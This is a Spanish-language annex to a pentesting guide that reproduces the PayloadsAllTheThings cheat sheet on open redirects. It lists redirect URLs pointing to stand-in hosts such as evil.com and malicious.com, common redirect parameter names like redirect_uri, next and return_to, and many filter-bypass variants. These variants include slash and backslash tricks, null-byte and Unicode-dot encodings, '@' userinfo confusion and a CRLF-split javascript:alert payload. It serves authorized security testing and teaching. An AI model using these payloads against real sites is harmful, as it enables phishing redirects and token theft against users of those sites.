# Open redirect: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Open Redirect/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Open%20Redirect/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Open URL Redirect / Metodología

```ps1
https://example.com/redirect?url=https://userpreferredsite.com
```

### Variantes presentes en tablas o texto del apartado

```text
userpreferredsite.com
```

## 2. Redirect Methods / Path-based Redirects

### Variantes presentes en tablas o texto del apartado

```text
https://example.com/redirect/http://malicious.com
https://example.com/redirect/../http://malicious.com
```

## 3. Redirect Methods / JavaScript-based Redirects

```js
var redirectTo = "http://trusted.com";
window.location = redirectTo;
```

### Variantes presentes en tablas o texto del apartado

```text
?redirectTo=http://malicious.com
```

## 4. Redirect Methods / Comunes Consulta Parámetros

```powershell
?checkout_url={payload}
?continue={payload}
?dest={payload}
?destination={payload}
?go={payload}
?image_url={payload}
?next={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?return_path={payload}
?return_to={payload}
?return={payload}
?returnTo={payload}
?rurl={payload}
?target={payload}
?url={payload}
?view={payload}
/{payload}
/redirect/{payload}
```

## 5. Open URL Redirect / Evasión de filtros

```powershell
    www.whitelisted.com.evil.com redirect to evil.com
```

```powershell
    java%0d%0ascript%0d%0a:alert(0)
```

```powershell
    //google.com
    ////google.com
```

```powershell
    https:google.com
```

```powershell
    \/\/google.com/
    /\/google.com/
```

```powershell
    /?redir=google。com
    //google%E3%80%82com
```

```powershell
    //google%00.com
```

```powershell
    ?next=whitelisted.com&next=google.com
```

```powershell
    //<user>:<password>@<host>:<port>/<url-path>
    http://www.theirsite.com@yoursite.com/
```

```powershell
    http://www.yoursite.com/http://www.theirsite.com/
    http://www.yoursite.com/folder/www.folder.com
```

```powershell
    http://www.yoursite.com?http://www.theirsite.com/
    http://www.yoursite.com?folder/www.folder.com
```

```powershell
    https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
    http://a.com／X.b.com
```

### Variantes presentes en tablas o texto del apartado

```text
//
////
\/\/
%E3%80%82
%00
?
/?
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
